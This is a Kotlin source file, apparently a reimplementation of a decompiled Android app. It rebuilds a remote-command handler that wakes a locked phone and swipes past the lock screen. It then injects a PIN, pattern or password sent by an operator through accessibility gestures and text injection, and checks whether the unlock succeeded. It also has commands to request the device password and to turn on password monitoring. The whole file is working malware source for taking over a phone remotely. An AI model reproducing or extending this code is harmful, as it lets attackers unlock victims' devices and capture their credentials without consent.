package com.storm.safe.rock.service.modules.command

import android.app.KeyguardManager
import android.os.Bundle
import android.os.PowerManager
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.delay
import org.json.JSONObject

/**
 * Handles device unlock and power management commands.
 *
 * Reverse-engineered from JADX: C0352a9 (a9, 1495 lines).
 * Vendor name: UnlockCommandHandler
 *
 * Supported commands:
 * - POWER_WAKE, POWER_SLEEP
 * - SMART_UNLOCK_SWIPE, NUMERIC_PIN_INPUT
 * - SMART_CONFIRM_DETECTION, UNLOCK_DEVICE
 * - GET_DEVICE_PASSWORD, SMART_NUMERIC_UNLOCK
 * - SMART_MIXED_UNLOCK, ENABLE_PASSWORD_MONITORING
 *
 * Static methods:
 * - a3 → clickConfirmButton
 * - a4 → findEditableNodes
 * - a9 → fillPasswordField
 * - b0 → sendUnlockResult
 */
class UnlockCommandHandler : CommandHandler {

    companion object {
        private const val TAG = "UnlockCmdHandler"

        /**
         * Send smart unlock result to the service for forwarding.
         * Vendor: m211888b0
         */
        fun sendUnlockResult(context: CommandContext, success: Boolean, message: String) {
            try {
                context.emitLocalEvent("smart_unlock_result", mapOf(
                    "success" to success,
                    "message" to message
                ))
                Log.d(TAG, "[智能解锁] 发送结果: success=$success, message=$message")
            } catch (e: Exception) {
                Log.e(TAG, "[智能解锁] 发送结果失败", e)
            }
        }

        /**
         * Click a confirm button by searching for known button texts.
         * Vendor: m211885a3
         */
        fun clickConfirmButton(service: android.accessibilityservice.AccessibilityService?) {
            try {
                val root = service?.rootInActiveWindow ?: return
                val confirmTexts = listOf("确认", "确定", "OK", "ok", "好的", "Enter")
                for (text in confirmTexts) {
                    val nodes = root.findAccessibilityNodeInfosByText(text)
                    if (!nodes.isNullOrEmpty()) {
                        val lastNode = nodes.last()
                        if (lastNode.isClickable) {
                            lastNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            Log.d(TAG, "[混合解锁] 点击确认按钮: $text")
                            return
                        }
                    }
                }
                Log.w(TAG, "[混合解锁] 未找到确认按钮，跳过")
            } catch (_: Exception) {
                // Vendor silently catches
            }
        }

        /**
         * Recursively find all editable nodes in the accessibility tree.
         * Vendor: m211886a4
         */
        fun findEditableNodes(node: AccessibilityNodeInfo, result: MutableList<AccessibilityNodeInfo>) {
            if (node.isEditable) {
                result.add(node)
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                findEditableNodes(child, result)
            }
        }

        /**
         * Fill a password field via ACTION_SET_TEXT on the accessibility tree.
         * Vendor: m211887a9
         */
        fun fillPasswordField(
            service: android.accessibilityservice.AccessibilityService?,
            password: String
        ): Boolean {
            try {
                val root = service?.rootInActiveWindow ?: return false
                val editables = mutableListOf<AccessibilityNodeInfo>()
                findEditableNodes(root, editables)

                // Find password field: prefer fields with password/number input type
                var targetNode: AccessibilityNodeInfo? = null
                for (node in editables) {
                    val inputType = node.inputType
                    if ((inputType and 0x80) != 0 || (inputType and 0x10) != 0) {
                        targetNode = node
                        break
                    }
                }
                // Fallback to last editable field
                if (targetNode == null) {
                    targetNode = editables.lastOrNull()
                }

                if (targetNode == null) {
                    Log.w(TAG, "[混合解锁] 未找到密码输入框节点")
                    return false
                }

                val bundle = Bundle().apply {
                    putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", password)
                }
                val result = targetNode.performAction(
                    AccessibilityNodeInfo.ACTION_SET_TEXT, bundle
                )
                Log.d(TAG, "[混合解锁] ACTION_SET_TEXT 结果: $result")
                return result
            } catch (_: Exception) {
                return false
            }
        }
    }

    override fun getSupportedCommands(): Set<String> = setOf(
        "POWER_WAKE",
        "POWER_SLEEP",
        "SMART_UNLOCK_SWIPE",
        "NUMERIC_PIN_INPUT",
        "SMART_CONFIRM_DETECTION",
        "UNLOCK_DEVICE",
        "GET_DEVICE_PASSWORD",
        "SMART_NUMERIC_UNLOCK",
        "SMART_MIXED_UNLOCK",
        "ENABLE_PASSWORD_MONITORING"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        when (command) {
            "POWER_WAKE" -> handlePowerWake(context)
            "POWER_SLEEP" -> handlePowerSleep(context)
            "SMART_UNLOCK_SWIPE" -> handleSmartUnlockSwipe(context)
            "NUMERIC_PIN_INPUT" -> handleNumericPinInput(params, context)
            "SMART_CONFIRM_DETECTION" -> handleSmartConfirmDetection(params, context)
            "UNLOCK_DEVICE" -> handleUnlockDevice(params, context)
            "GET_DEVICE_PASSWORD" -> handleGetDevicePassword(params, context)
            "SMART_NUMERIC_UNLOCK" -> handleSmartNumericUnlock(params, context)
            "SMART_MIXED_UNLOCK" -> handleSmartMixedUnlock(params, context)
            "ENABLE_PASSWORD_MONITORING" -> handleEnablePasswordMonitoring(context)
        }
    }

    private fun handlePowerWake(context: CommandContext) {
        Log.d(TAG, "点亮屏幕")
        try {
            val pm = context.service?.getSystemService("power") as? PowerManager
                ?: throw IllegalStateException("PowerManager not available")
            @Suppress("DEPRECATION")
            val wakeLock = pm.newWakeLock(
                PowerManager.FULL_WAKE_LOCK or
                    PowerManager.ACQUIRE_CAUSES_WAKEUP or
                    PowerManager.ON_AFTER_RELEASE,
                "SystemHelper:WakeLock"
            )
            wakeLock.acquire(30_000L)
            Log.d(TAG, "屏幕已点亮（保持30秒）")
        } catch (e: Exception) {
            Log.e(TAG, "点亮屏幕失败", e)
        }
    }

    private fun handlePowerSleep(context: CommandContext) {
        Log.d(TAG, "锁定屏幕")
        try {
            // GLOBAL_ACTION_LOCK_SCREEN = 8
            val result = context.service?.performGlobalAction(8) ?: false
            if (result) {
                Log.d(TAG, "屏幕已锁定")
            } else {
                Log.w(TAG, "锁定屏幕失败（可能需要Android 9.0+）")
            }
        } catch (e: Exception) {
            Log.e(TAG, "锁定屏幕失败", e)
        }
    }

    private fun handleSmartUnlockSwipe(context: CommandContext) {
        Log.d(TAG, "执行智能上滑解锁")
        try {
            val service = context.service ?: return
            val metrics = service.resources.displayMetrics
            val w = metrics.widthPixels.toFloat()
            val h = metrics.heightPixels.toFloat()
            service.performSwipe(w / 2f, h * 0.8f, w / 2f, h * 0.3f, 300L)
            Log.d(TAG, "智能上滑解锁已执行")
        } catch (e: Exception) {
            Log.e(TAG, "智能上滑解锁失败", e)
        }
    }

    private suspend fun handleNumericPinInput(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "执行数字密码输入")
        try {
            val digit = params?.optString("digit", "")?.ifEmpty {
                params.optString("pin", "")
            } ?: ""

            if (digit.isEmpty()) {
                Log.w(TAG, "数字密码输入参数无效: digit/pin 为空")
                return
            }

            val service = context.service
            var screenWidth = params?.optInt("screenWidth", 0) ?: 0
            var screenHeight = params?.optInt("screenHeight", 0) ?: 0

            if ((screenWidth <= 0 || screenHeight <= 0) && service != null) {
                val metrics = service.resources.displayMetrics
                screenWidth = metrics.widthPixels
                screenHeight = metrics.heightPixels
                Log.d(TAG, "自动检测屏幕尺寸: ${screenWidth}x${screenHeight}")
            }

            if (screenWidth <= 0 || screenHeight <= 0) {
                Log.w(TAG, "数字密码输入参数无效: 屏幕尺寸无法获取")
                return
            }

            val index = params?.optInt("index", 0) ?: 0
            val total = params?.optInt("total", 0) ?: 0

            if (index <= 1 && service != null) {
                Log.d(TAG, "数字密码输入前唤醒屏幕")
                handlePowerWake(context)
                delay(500L)
            }

            if (service == null) {
                Log.w(TAG, "AccessibilityService 未初始化，无法执行 PIN 输入")
                return
            }

            val pinPadManager = PinPadInputManager(service)
            pinPadManager.inputNumericPassword(digit, screenWidth, screenHeight)
            Log.d(TAG, "数字密码输入已执行: $digit ($index/$total)")
        } catch (e: Exception) {
            Log.e(TAG, "数字密码输入失败", e)
        }
    }

    private fun handleSmartConfirmDetection(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "执行智能确认按钮检测")
        try {
            val passwordType = params?.optString("passwordType", "") ?: ""
            val screenWidth = params?.optInt("screenWidth", 0) ?: 0
            val screenHeight = params?.optInt("screenHeight", 0) ?: 0

            if (screenWidth <= 0 || screenHeight <= 0) {
                Log.w(TAG, "智能确认检测参数无效")
                return
            }

            val service = context.service ?: return
            clickConfirmButton(service)
            Log.d(TAG, "智能确认按钮检测完成: passwordType=$passwordType")
        } catch (e: Exception) {
            Log.e(TAG, "智能确认按钮检测失败", e)
        }
    }

    private suspend fun handleUnlockDevice(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "[UNLOCK_DEVICE] 收到图案解锁命令")
        try {
            val dataObj = params?.optJSONObject("data")
            val patternArray = dataObj?.optJSONArray("pattern")
                ?: params?.optJSONArray("pattern")

            if (patternArray == null || patternArray.length() < 4) {
                Log.w(TAG, "[UNLOCK_DEVICE] 图案解锁参数无效: length=${patternArray?.length() ?: 0}")
                return
            }

            val points = mutableListOf<Int>()
            for (i in 0 until patternArray.length()) {
                points.add(patternArray.optInt(i))
            }
            val patternString = points.joinToString(",")
            Log.d(TAG, "[UNLOCK_DEVICE] 完整图案: $patternString (${points.size}个点)")

            val service = context.service

            Log.d(TAG, "[UNLOCK_DEVICE] 步骤1: 唤醒屏幕")
            handlePowerWake(context)
            delay(1000L)

            Log.d(TAG, "[UNLOCK_DEVICE] 步骤2: 执行上滑解锁手势")
            if (service != null) {
                val metrics = service.resources.displayMetrics
                val w = metrics.widthPixels.toFloat()
                val h = metrics.heightPixels.toFloat()
                service.performSwipe(w / 2f, h * 0.8f, w / 2f, h * 0.3f, 300L)
            }
            delay(1500L)

            Log.d(TAG, "[UNLOCK_DEVICE] 步骤3: 开始绘制图案")
            context.emitLocalEvent("pattern_replay", mapOf("pattern" to patternString))
        } catch (e: Exception) {
            Log.e(TAG, "[UNLOCK_DEVICE] 图案解锁失败", e)
        }
    }

    private fun handleGetDevicePassword(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "收到获取设备密码命令（控制端）")
        val passwordType = params?.optString("passwordType", "") ?: ""
        Log.d(TAG, "密码类型参数: $passwordType")

        val resolvedType = when {
            passwordType == "PIN_4" -> "PIN_4"
            passwordType == "PIN_6" -> "PIN_6"
            passwordType == "PATTERN" -> "PATTERN"
            else -> "PIN_6"
        }

        // vendor: checks if keyguard is locked, saves type for deferred trigger
        // Wire: val km = context.service?.getSystemService("keyguard") as? android.app.KeyguardManager
        // Wire: val isLocked = km?.isKeyguardLocked ?: false
        // Wire: context.service?.savedPasswordType = resolvedType
        Log.d(TAG, "密码类型已保存: $resolvedType, 等待解锁触发")
    }

    private suspend fun handleSmartNumericUnlock(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "[智能解锁] 开始执行带判断的数字解锁")
        try {
            val password = params?.optString("password", "") ?: ""
            val service = context.service
            var screenWidth = params?.optInt("screenWidth", 0) ?: 0
            var screenHeight = params?.optInt("screenHeight", 0) ?: 0

            if ((screenWidth <= 0 || screenHeight <= 0) && service != null) {
                val metrics = service.resources.displayMetrics
                screenWidth = metrics.widthPixels
                screenHeight = metrics.heightPixels
            }

            if (password.isEmpty() || screenWidth <= 0 || screenHeight <= 0) {
                Log.e(TAG, "[智能解锁] 参数无效: password=${password.length}位, screen=${screenWidth}x${screenHeight}")
                sendUnlockResult(context, false, "参数无效")
                return
            }

            if (service != null) {
                val km = service.getSystemService("keyguard") as? KeyguardManager
                if (km != null && !km.isKeyguardLocked) {
                    Log.d(TAG, "[智能解锁] 设备未锁屏，无需解锁")
                    sendUnlockResult(context, true, "设备未锁屏")
                    return
                }
            }

            Log.d(TAG, "[智能解锁] 步骤2: 唤醒屏幕")
            handlePowerWake(context)
            delay(500L)

            Log.d(TAG, "[智能解锁] 步骤3: 执行上滑")
            service?.performSwipe(
                screenWidth / 2f, screenHeight * 0.8f,
                screenWidth / 2f, screenHeight * 0.3f, 300L
            )

            Log.d(TAG, "[智能解锁] 步骤4: 检测数字键盘")
            val keypadFound = waitForNumericKeypad(context, 3000L)
            if (keypadFound) {
                Log.d(TAG, "[智能解锁] 检测到数字键盘，等待1秒确保就绪")
                delay(1000L)
            } else {
                Log.w(TAG, "[智能解锁] 未检测到数字键盘，尝试继续输入")
            }

            Log.d(TAG, "[智能解锁] 步骤5: 输入密码 (${password.length}位)")
            if (service == null) {
                sendUnlockResult(context, false, "Service未初始化")
                return
            }
            val pinPadManager = PinPadInputManager(service)
            pinPadManager.inputNumericPassword(password, screenWidth, screenHeight)

            Log.d(TAG, "[智能解锁] 步骤6: 检测解锁结果")
            delay(800L)
            val unlocked = waitForUnlockResult(context, 5000L)
            if (unlocked) {
                Log.d(TAG, "[智能解锁] 解锁成功")
                sendUnlockResult(context, true, "解锁成功")
            } else {
                Log.w(TAG, "[智能解锁] 解锁失败，密码可能错误")
                sendUnlockResult(context, false, "解锁失败，密码可能错误")
            }
        } catch (e: Exception) {
            Log.e(TAG, "[智能解锁] 执行异常", e)
            sendUnlockResult(context, false, "执行异常: ${e.message}")
        }
    }

    private suspend fun handleSmartMixedUnlock(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "[混合解锁] 开始执行字母数字密码解锁")
        try {
            val password = params?.optString("password", "") ?: ""
            if (password.isEmpty()) {
                Log.e(TAG, "[混合解锁] 密码为空")
                sendUnlockResult(context, false, "密码为空")
                return
            }

            val service = context.service
            if (service != null) {
                val km = service.getSystemService("keyguard") as? KeyguardManager
                if (km != null && !km.isKeyguardLocked) {
                    Log.d(TAG, "[混合解锁] 设备未锁屏，无需解锁")
                    sendUnlockResult(context, true, "设备未锁屏")
                    return
                }
            }

            Log.d(TAG, "[混合解锁] 步骤1: 唤醒屏幕")
            handlePowerWake(context)
            delay(500L)

            Log.d(TAG, "[混合解锁] 步骤2: 执行上滑")
            if (service != null) {
                val metrics = service.resources.displayMetrics
                val w = metrics.widthPixels.toFloat()
                val h = metrics.heightPixels.toFloat()
                service.performSwipe(w / 2f, h * 0.8f, w / 2f, h * 0.3f, 300L)
            }
            delay(1200L)

            Log.d(TAG, "[混合解锁] 步骤3: 查找输入框并注入密码")
            val filled = fillPasswordField(service, password)
            if (!filled) {
                Log.w(TAG, "[混合解锁] 未找到输入框，尝试剪贴板输入")
                try {
                    val clipboard = service?.getSystemService(android.content.Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
                    clipboard?.setPrimaryClip(android.content.ClipData.newPlainText("pwd", password))
                } catch (_: Exception) {}
                delay(800L)
            }

            Log.d(TAG, "[混合解锁] 步骤4: 尝试点击确认按钮")
            clickConfirmButton(service)
            delay(800L)

            val unlocked = waitForUnlockResult(context, 5000L)
            if (unlocked) {
                Log.d(TAG, "[混合解锁] 解锁成功")
                sendUnlockResult(context, true, "解锁成功")
            } else {
                Log.w(TAG, "[混合解锁] 解锁失败，密码可能错误")
                sendUnlockResult(context, false, "解锁失败，密码可能错误")
            }
        } catch (e: Exception) {
            Log.e(TAG, "[混合解锁] 执行异常", e)
            sendUnlockResult(context, false, "执行异常: ${e.message}")
        }
    }

    private fun handleEnablePasswordMonitoring(context: CommandContext) {
        Log.d(TAG, "收到启用密码监听命令")
        try {
            val service = context.service ?: return
            service.isCipherCaptureEnabled = true
            Log.d(TAG, "密码监听模式已启用")
        } catch (e: Exception) {
            Log.e(TAG, "启用密码监听失败", e)
        }
    }

    /**
     * Poll KeyguardManager.isKeyguardLocked() until unlocked or timeout.
     * Vendor: C0352a9.m211894b2
     * @return true if unlocked within timeout, false if still locked
     */
    suspend fun waitForUnlockResult(context: CommandContext, timeoutMs: Long): Boolean {
        val service = context.service ?: return false
        val start = System.currentTimeMillis()
        while (System.currentTimeMillis() - start < timeoutMs) {
            try {
                val km = service.getSystemService("keyguard") as? KeyguardManager
                if (km != null && !km.isKeyguardLocked) return true
            } catch (_: Exception) {}
            delay(200L)
        }
        return false
    }

    /**
     * Poll accessibility tree for numeric keypad presence.
     * Vendor: C0352a9.m211893b1
     * @return true if keypad detected (5+ digit buttons), false if timeout
     */
    suspend fun waitForNumericKeypad(context: CommandContext, timeoutMs: Long): Boolean {
        val service = context.service ?: return false
        val start = System.currentTimeMillis()
        while (System.currentTimeMillis() - start < timeoutMs) {
            try {
                val root = service.rootInActiveWindow
                if (root != null) {
                    var found = 0
                    for (d in 0..9) {
                        val nodes = root.findAccessibilityNodeInfosByText(d.toString())
                        if (!nodes.isNullOrEmpty()) found++
                    }
                    root.recycle()
                    if (found >= 5) {
                        Log.d(TAG, "[键盘检测] 找到${found}个数字按钮")
                        return true
                    }
                }
            } catch (_: Exception) {}
            delay(200L)
        }
        return false
    }
}
